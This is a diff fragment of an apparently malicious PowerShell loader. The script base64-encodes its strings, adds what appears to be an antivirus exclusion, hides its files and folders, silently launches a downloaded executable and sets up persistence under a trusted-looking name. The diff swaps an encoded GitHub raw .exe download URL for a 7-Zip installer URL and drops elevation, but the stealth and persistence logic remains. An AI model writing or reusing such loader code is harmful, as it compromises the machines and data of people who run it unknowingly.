@@ -5,7 +5,7 @@ function Add-Exclusion {
     } catch {}
 }
 
-$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYLzUwNzctbmVjZXNzZS1wby1zZXRpLWJlc3BsYXRuby16YXB1c2svcmF3L3JlZnMvaGVhZHMvbWFpbi9kb2xiYWViLmV4ZQ=="
+$downloadUrlB64 = "aHR0cHM6Ly93d3cuNy16aXAub3JnL2EvN3oyNDA5LXg2NC5leGU="
 $updaterExeB64 = "dXBkYXRlci5leGU="
 $hiddenAttrB64 = "SGlkZGVu"
 $silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
@@ -44,7 +44,7 @@ try {
     Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
     Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
     
-    $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -PassThru -Wait
+    $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -PassThru -Wait
 
     if ($process.ExitCode -eq 0) {
         $persistScriptPath = Join-Path $persistFolder $trustedName
